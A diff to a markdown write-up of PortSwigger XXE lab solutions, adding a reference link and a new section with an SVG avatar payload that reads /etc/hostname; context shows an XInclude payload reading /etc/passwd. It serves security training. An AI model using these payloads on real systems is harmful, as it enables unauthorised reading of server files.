@@ -11,6 +11,7 @@
 - [Exploiting blind XXE to exfiltrate data using a malicious external DTD](#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
 - [Exploiting blind XXE to retrieve data via error messages](#exploiting-blind-xxe-to-retrieve-data-via-error-messages)
 - [Exploiting XInclude to retrieve files](#exploiting-xinclude-to-retrieve-files)
+- [Exploiting XXE via image file upload](#exploiting-xxe-via-image-file-upload)
 
 ## Exploiting XXE using external entities to retrieve files
 Reference: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
@@ -118,7 +119,7 @@ When imported, this page will read the contents of ``/etc/passwd`` into the ``fi
 You should see an error message containing the contents of the ``/etc/passwd`` file.
 
 ## Exploiting XInclude to retrieve files
-Reference: 
+Reference: https://portswigger.net/web-security/xxe/lab-xinclude-attack
 
 <!-- omit in toc -->
 ### Solution
@@ -127,3 +128,19 @@ Reference:
 ```
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
+
+## Exploiting XXE via image file upload
+Reference: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
+
+<!-- omit in toc -->
+### Solution 
+1. Create a local SVG image with the following content:
+```xml
+<?xml version="1.0" standalone="yes"?>
+    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+        <text font-size="16" x="0" y="16">&xxe;</text>
+    </svg>
+```
+2. Post a comment on a blog post, and upload this image as an avatar.
+3. When you view your comment, you should see the contents of the ``/etc/hostname`` file in your image. Use the "Submit solution" button to submit the value of the server hostname.
